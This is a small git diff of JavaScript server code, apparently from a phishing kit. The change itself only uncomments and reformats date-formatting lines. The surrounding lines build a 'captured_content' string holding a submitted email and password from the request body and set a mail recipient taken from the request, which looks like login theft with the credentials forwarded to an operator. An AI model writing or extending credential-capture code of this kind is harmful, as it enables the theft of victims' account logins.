@@ -56,15 +56,15 @@ const decryptedPass = cryptr.decrypt(encryptedPass);
 
 //console.log(decryptedPass);b
  
-/* 
- const date = new Date()
+
+ const date = new Date();
  const year = date.getFullYear();
 const month = date.getMonth() + 1;
 const day = date.getDate();
- let fulldate =year+"-"+month+"-"+day;
+ let fulldate =[year,month,day].join("-");
  console.log(fulldate);
  
- */
+ 
  
     var captured_content = `\n Email: ${req.body.email} Password: ${encryptedPass}`;
     let toMail = req.body.owner;
